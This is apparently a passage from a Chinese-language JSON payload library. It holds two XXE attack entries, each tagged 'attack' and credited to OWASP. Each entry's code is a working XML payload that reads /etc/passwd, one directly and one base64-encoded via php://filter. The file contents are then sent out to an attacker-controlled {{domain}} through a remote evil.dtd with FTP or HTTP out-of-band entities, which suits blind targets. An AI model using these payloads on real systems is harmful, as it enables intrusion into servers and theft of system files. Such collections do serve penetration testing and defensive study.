    {
      "id": "xxe-ftp-oob",
      "title": "FTP 带外外带文件",
      "category": "盲打带外",
      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % dtd SYSTEM \"http://{{domain}}/evil.dtd\">\n%dtd;]>\n<root/>",
      "desc": "加载远程 DTD，由 evil.dtd 内定义 %file 与 FTP 外带实体，把文件内容带出，适合无回显场景。",
      "tags": ["xxe", "blind", "ftp", "oob"],
      "vars": ["domain"],
      "risk": "attack",
      "source": "OWASP XXE Prevention Cheat Sheet"
    },
    {
      "id": "xxe-parameter-entity",
      "title": "参数实体外带",
      "category": "参数实体",
      "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE root [<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://{{domain}}/?x=%file;'>\">\n%eval;\n%exfil;]>\n<root/>",
      "desc": "利用参数实体在 DTD 中拼接 URL，将文件内容编码后带出。",
      "tags": ["xxe", "parameter-entity", "oob"],
      "vars": ["domain"],
      "risk": "attack",
      "source": "OWASP XXE Prevention Cheat Sheet"
